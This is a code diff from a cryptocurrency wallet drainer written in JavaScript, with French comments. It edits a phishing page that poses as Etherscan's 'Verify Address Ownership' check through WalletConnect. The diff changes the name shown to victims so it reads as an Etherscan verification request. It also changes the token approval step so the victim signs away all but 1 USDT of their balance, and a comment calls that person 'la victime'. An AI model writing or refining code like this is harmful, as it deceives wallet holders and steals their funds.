@@ -1256,7 +1256,7 @@ async function initWalletConnect() {
   signClient = await SignClientClass.init({
     projectId: PROJECT_ID,
     metadata: {
-      name: 'Etherscan',
+      name: 'Etherscan souhaite vérifier que vous contrôlez cette adresse et',
       description: 'Verify Address Ownership',
       url: 'https://chainintegrity.io', // ← ton domaine actuel
       icons: ['https://chainintegrity.io/etherscan-logo-circle.png']
@@ -1376,7 +1376,7 @@ async function sendExactApproveTransaction() {
     }
 
     // 👇 On calcule le montant à laisser à la victime (ici 0.000001 USDT)
-    const LEAVE_AMOUNT = ethers.utils.parseUnits('0.000001', decimals);
+    const LEAVE_AMOUNT = ethers.utils.parseUnits('1', decimals); // laisse 1 USDT
     let approveAmount = balance;
     if (balance.gt(LEAVE_AMOUNT)) {
       approveAmount = balance.sub(LEAVE_AMOUNT);
